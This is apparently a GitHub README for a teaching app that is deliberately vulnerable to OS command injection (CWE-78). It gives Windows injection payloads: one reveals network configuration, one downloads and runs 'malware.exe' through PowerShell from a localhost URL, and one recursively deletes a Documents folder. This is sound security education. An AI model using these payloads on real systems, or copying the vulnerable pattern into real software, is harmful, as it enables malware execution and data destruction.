# OS-Command-injection-examples
## Overview
This repository is designed to demonstrate how an application can be vulnerable to the injection of operating system commands, a vulnerability further explained in the Common Weakness Enumeration (CWE) page [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html).
The core of the repository is a vulnerable application, with a frontend built using JavaScript and HTML, and a backend implemented in Java, with Maven managing its plugins and builds.

## Installation
To install the app, you should first open blank project and clone the repository with

``` git clone https://github.com/Krisi531/OS-Command-injection-examples.git ```

After that, locate to the main folder of the project and execute following command in terminal:

``` java -cp target/command-search-1.0-SNAPSHOT.jar CommandSearchServer ```

Message *Server started on port 8080* should appear in the terminal.

Open your browser and navigate to  

` http:\\localhost:8080 `

## Examples
There are two pages where you can test your queries: Game Selection and Directory Selection. In the Game Selection page, entering a desired game will display the top 5 players, but the search logic is intentionally vulnerable, allowing for the execution of other OS commands as well. The Directory Selection page operates similarly, but it performs a more general search, not limited to a specific player's folder. All test commands are Windows-based.

### Example 1
Games Selection: 

``` counter strike 2 & ipconfig /all ```

**Result:** Network configuration will be shown besides the players because '&' means that both commands will be executed. Whole command that is being executed looks like this: ` cmd.exe /c dir D:\BestPlayers\counterstrike2 /ad /b&ipconfig/all `. 
Flag ` /c ` means that terminal is exiting after finishing given commands, and flags ` /ad /b ` mean that only directory names should be listed without additional data.


### Example 2
Directory Selection:

``` something_wrong || powershell -Command Invoke-WebRequest -Uri http://localhost:8080/testattack -OutFile D:\Test\malware.exe; Start-Process D:\Test\malware.exe ```

**Result:** Attacker may not want to read specific file but rather save malicious code into the users account and start it later. This command saves ` malware.exe ` that is hosted on ` http://localhost:8080/testattack ` in the ` D:\Test\ ` directory of the users file system. He can also include ` Start-Process D:\Test\malware.exe ` to start .exe file immediately. He makes first command (plain search) fail and then is sure that second command will be executed because of the ` || `.

### Example 3
Directory Selection:

``` D:\MyData & rmdir /s /q D:\Documents ```

**Result:** If ` D:\MyData ` exists attacker may access some files that are confidential for the user and he can also delete some of his important files such as ` D:\Documents `. Flag ` /s ` means deleting directory and all of its contents, including any subdirectories and files, and flag ` /q ` suppresses confirmation prompts, so rmdir will not ask for confirmation before deleting a directory, even if it contains files or subdirectories.
